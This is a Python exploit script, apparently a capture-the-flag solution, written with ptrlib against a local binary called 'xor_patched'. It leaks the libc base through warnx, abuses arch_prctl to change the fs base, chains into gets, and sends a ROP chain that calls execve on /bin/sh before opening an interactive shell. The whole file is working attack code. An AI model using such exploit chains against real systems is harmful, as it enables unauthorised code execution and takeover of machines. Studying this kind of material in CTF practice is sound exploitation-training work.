#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./xor_patched")
libc = ptr.ELF("./libc.so.6")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 9999)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    global libc
    global elf

    io = connect()

    new_fsbase = unwrap(elf.section(".bss")) + 0x100
    arch_get_fs = 0x1002
    warnx_lower_2_bytes = int(hex(unwrap(libc.symbol("warnx")))[4:], 16)

    pl1 = ptr.p64(0) * 4  # key
    pl1 += ptr.p64(0) * 4  # buf
    pl1 += ptr.p64(0)  # error (arg2)
    pl1 += ptr.p32(unwrap(elf.got("read")))  # status (arg1)
    pl1 += ptr.p32(0)  # dummy
    pl1 += ptr.p16(warnx_lower_2_bytes)  # throw

    io.send(pl1)
    io.recvuntil("xor_patched: ")
    libc.base = ptr.u64(io.recv(6)) - unwrap(libc.symbol("read"))
    print(f"libc_base = {hex(libc.base)}")

    pl2 = ptr.p64(0) * 4  # buf
    pl2 += ptr.p64(new_fsbase)  # error
    pl2 += ptr.p32(arch_get_fs)  # status
    pl2 += ptr.p32(0)  # dummy
    pl2 += ptr.p64(unwrap(libc.symbol("arch_prctl")))  # throw
    pl2 += ptr.p64(0)
    pl2 += ptr.p64(0)
    pl2 += ptr.p64(
        next(
            libc.gadget(
                "mov rdi, rsi; bsr eax, eax; lea rax, [rdi+rax-0x20]; vzeroupper; ret;"
            )
        )
    )
    pl2 += ptr.p64(unwrap(libc.symbol("gets")))

    io.send(pl2)

    pl3 = b""
    pl3 += b"A" * 0x8
    pl3 += b"B" * 0x8
    pl3 += b"C" * 0x8
    pl3 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl3 += ptr.p64(next(libc.find("/bin/sh")))
    pl3 += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    pl3 += ptr.p64(0)
    pl3 += ptr.p64(next(libc.gadget("xor edx, edx; mov eax, r10d; ret;")))
    pl3 += ptr.p64(next(libc.gadget("pop rax; ret;")))
    pl3 += ptr.p64(59)
    pl3 += ptr.p64(next(libc.gadget("syscall")))

    io.sendline(pl3)
    io.sendline("echo pwned!")
    io.recvuntil("pwned!\n")
    io.sh()


if __name__ == "__main__":
    main()
